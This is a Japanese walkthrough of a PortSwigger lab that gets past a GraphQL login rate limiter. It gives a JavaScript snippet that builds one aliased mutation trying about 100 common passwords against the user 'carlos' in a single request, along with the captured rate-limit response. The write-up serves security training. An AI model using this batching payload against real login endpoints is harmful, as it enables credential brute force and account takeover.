# GraphQL ブルートフォース保護のバイパス

次のハッキングラボを実施します  
https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass  
このラボのユーザー ログイン メカニズムは、GraphQL API を利用しています。API エンドポイントには、短期間に同じオリジンから多すぎるリクエストを受信した場合にエラーを返すレート リミッターがあります。

- 1. BurpSuitewp 起動して、Proxy タブからブラウザを立ち上げます
- 2. ブラウザからハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. POST /graphql/v1 HTTP/2 リクエストを send to repeater します
- 5. 何度か誤ったパスワードでログインリクエストを送信します。
     4 回程度でレートリミットに引っかかるので、単純なブルートフォースは難しいです。

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=u8ne9QzeH0Z9VhQlqlOPNNsNdkdELBC4; Secure; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 478

{
  "errors": [
    {
      "path": [
        "login"
      ],
      "extensions": {
        "message": "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
      },
      "locations": [
        {
          "line": 3,
          "column": 9
        }
      ],
      "message": "Exception while fetching data (/login) : You have made too many incorrect login attempts. Please try again in 1 minute(s)."
    }
  ],
  "data": {
    "login": null
  }
}
```

- 6. GraphQL で 1 回のリクエストでまとめて確認するため、パスワードリストからクエリを生成します。以下のクエリを Chrome の Dev Tool で実行すると、クエリがクリップボードにコピーされます

```
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

- 7. リピーターのクエリを一旦空にします

```
{"query":
```

- 8. GraphQL タブに貼り付けて送信します。
     ログイン成功が１つあります。
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/40769bc0-7991-4d5a-a133-6b220f5e4f78)

- 9. ログイン成功したパスワードでログインします。
